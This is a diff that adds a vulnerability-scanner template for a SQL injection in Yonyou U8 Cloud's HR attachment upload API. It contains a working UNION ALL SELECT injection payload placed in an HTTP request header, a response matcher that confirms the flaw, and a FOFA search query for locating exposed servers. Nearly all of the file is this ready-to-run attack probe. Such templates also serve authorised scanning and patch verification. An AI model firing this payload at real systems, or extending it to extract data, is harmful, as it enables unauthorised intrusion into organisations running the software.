@@ -1,0 +1,30 @@
+id: yonyou-u8-cloud-attachment-upload-sqli
+
+info:
+  name: 用友 U8 Cloud attachment/upload - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,sqli,u8cloud,oa
+
+http:
+  - raw:
+      - |
+        POST /u8cloud/api/hr/attachment/upload?mssql_error HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        system: 1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(106)+CHAR(120)+CHAR(112)+CHAR(113)+ISNULL(CAST(111*111 AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(120)+CHAR(113)+CHAR(120)+CHAR(113),NULL-- QIwq
+        trantype: pk
+        isEncrypt: N
+        sign: token
+        Connection: close
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'12321','errorcode') || contains_all(body,'ORA-','errorcode')
